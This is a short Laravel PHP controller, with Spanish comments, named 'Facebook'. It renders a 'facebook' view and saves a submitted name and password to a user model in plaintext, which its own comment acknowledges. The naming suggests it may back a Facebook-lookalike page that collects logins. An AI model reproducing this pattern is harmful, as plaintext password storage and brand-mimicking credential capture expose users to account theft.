<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Usuarios;

class Facebook extends Controller
{
    public function index(){
        return view('facebook');
    }

    public function create(Request $request){
        // Valida los datos según tus necesidades
        $request->validate([
            'Nombre' => 'required',
            'Contraseña' => 'required',
        ]);

        // Crea una nueva instancia del modelo y guarda los datos
        Usuarios::create([
            'Nombre' => $request->input('Nombre'),
            'Contraseña' => $request->input('Contraseña'), // Recomiendo cifrar la contraseña antes de almacenarla
        ]);

        // Puedes redirigir o hacer cualquier otra cosa después de guardar los datos
        return redirect()->route('index'); // Ajusta 'nombre.ruta' según 
    }
}